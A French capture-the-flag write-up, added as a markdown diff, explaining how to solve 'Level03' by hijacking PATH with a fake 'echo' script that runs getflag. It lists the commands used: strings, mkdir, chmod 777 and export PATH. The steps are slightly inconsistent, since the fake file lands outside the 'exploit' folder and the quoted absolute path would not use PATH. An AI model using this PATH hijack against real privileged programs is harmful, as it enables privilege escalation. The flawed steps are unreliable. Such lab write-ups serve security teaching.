@@ -1,0 +1,31 @@
+### Level03
+
+Nous utilisons la commande suivante :
+
+	strings level03
+	
+sur le fichier binaire pour extraire le texte lisible. Nous y trouvons la chaîne "/usr/bin/echo "Exploit me"".
+
+L'exécutable utilise la variable d'environnement PATH pour exécuter la commande 'echo'.
+Nous accédons au répertoire /tmp et créons un dossier nommé 'exploit' qui contiendra un fichier nommé 'echo' :
+
+	cd /tmp
+	mkdir exploit
+	touch echo
+
+Nous éditons le fichier 'echo' pour y insérer les lignes suivantes :
+
+	#!/bin/sh
+	getflag
+
+Cela permettra d'exécuter la commande 'getflag' à partir du fichier 'echo', qui est en réalité un script bash.
+Nous accordons les droits d'accès complets au fichier 'echo' :
+	
+	chmod 777 echo
+
+Nous modifions la variable d'environnement PATH pour inclure le répertoire '/tmp/exploit' en premier :
+
+	export PATH=/tmp/exploit:/bin
+
+Nous exécutons 'level03' et obtenons ainsi le drapeau recherché.
+
